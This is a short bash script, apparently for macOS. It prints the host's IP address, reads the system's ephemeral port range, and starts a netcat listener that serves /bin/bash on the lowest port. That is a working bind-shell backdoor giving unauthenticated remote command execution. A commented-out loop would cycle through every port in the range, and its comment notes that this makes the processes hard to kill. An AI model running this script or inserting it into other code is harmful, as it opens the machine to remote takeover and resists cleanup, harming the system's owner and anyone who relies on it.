#!/bin/bash
ifconfig en1 | grep 'inet ' | cut -d' ' -f2
#nc -l -p 3333 -e /bin/bash
read lowerPort upperPort <<< $(/usr/sbin/sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last | cut -d':' -f2 | cut -d' ' -f2)
echo $lowerPort
nc -l -p $lowerPort -e /bin/bash
#this loop is interesting. makes it hard to kill the processes
#while :; do
	#for (( port = lowerPort ; port <= upperPort ; port++ )); do
		#nc -l -p "$port" -e /bin/bash && break 
	#done
#done
